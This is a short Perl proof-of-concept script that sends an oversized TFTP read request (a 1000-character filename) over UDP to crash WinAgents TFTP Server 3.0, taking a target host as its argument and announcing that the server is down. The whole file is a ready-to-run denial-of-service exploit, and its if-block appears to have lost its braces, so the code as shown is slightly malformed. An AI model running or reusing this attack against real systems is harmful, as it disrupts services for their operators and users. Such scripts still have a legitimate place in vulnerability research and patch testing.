#!/usr/bin/perl
# 
# Remote D.O.S WinAgents TFTP Server ver 3.0 
# 
# Tftp.pl <Host>

use IO::Socket;

$Tftp_Port = "69";
$FileName = "A"x1000;
$Tftp_OP = "\x00\x01";
$Tftp_M  = "bin";
$Buf = $Tftp_OP . $Tftp_M . $FileName ;

if(!($ARGV[0]))
 
 print "\nUsage: perl $0 <Host>\n" ;
 
 exit;
 

print "\nRemote D.O.S WinAgents TFTP Server ver 3.0 PoC\n\n\n";


$socket = IO::Socket::INET->new(Proto => "udp") or die "Socket Error ...\n"
;
$ipaddr = inet_aton($ARGV[0]);
$portaddr = sockaddr_in($Tftp_Port, $ipaddr);
send($socket, $Buf, 0, $portaddr) == length($Buf) or die "Error : Can't send ...\n";
print "Server : $ARGV[0] Is Down ... \n";
